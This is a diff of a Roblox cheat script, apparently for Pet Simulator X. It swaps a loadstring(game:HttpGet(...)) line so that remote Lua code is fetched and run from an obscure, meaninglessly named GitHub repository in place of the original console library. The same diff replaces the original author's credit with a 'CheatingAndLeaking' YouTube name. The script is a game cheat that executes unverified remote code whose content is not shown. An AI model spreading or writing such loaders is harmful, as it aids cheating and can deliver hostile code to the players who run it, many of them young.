@@ -4,11 +4,11 @@ end
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
-local console = loadstring(game:HttpGet("https://raw.githubusercontent.com/4lve/SynapseXConsole/main/maine.lua"))()
+local console = loadstring(game:HttpGet("https://raw.githubusercontent.com/EEEFGA/sdxyfhgj/main/rarererr"))()
 console.new()
-console.windowname('PSX Script Created By 4lve#0001')
+console.windowname('PSX Script Created By CheatingAndLeaking On Youtube')
 console.clear()
-console.log('Joined Server! Script Created By 4lve#0001')
+console.log('Joined Server! Script Created By CheatingAndLeaking On Youtube')
 console.newline()
 local Lib = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
 while not Lib.Loaded do
